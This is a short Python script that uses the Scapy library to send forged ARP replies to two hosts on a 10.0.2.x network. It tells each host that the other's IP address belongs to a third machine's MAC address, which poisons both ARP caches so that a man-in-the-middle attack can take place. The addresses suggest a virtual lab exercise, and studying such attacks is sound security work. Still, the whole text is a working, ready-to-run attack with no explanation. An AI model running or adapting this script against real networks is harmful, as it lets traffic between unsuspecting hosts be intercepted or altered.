#!/usr/bin/python3
from scapy.all import *

def send_ARP_packet(mac_dst, mac_src, ip_dst, ip_src):
	E = Ether(dst=mac_dst, src=mac_src)
	A = ARP(op=2,hwsrc=mac_src,psrc=ip_src, hwdst=mac_dst, pdst=ip_dst)
	pkt = E/A
	sendp(pkt)

send_ARP_packet('08:00:27:cd:2d:fd', '08:00:27:b7:ba:af', '10.0.2.8','10.0.2.9')
send_ARP_packet('08:00:27:34:16:8b','08:00:27:b7:ba:af','10.0.2.9','10.0.2.8')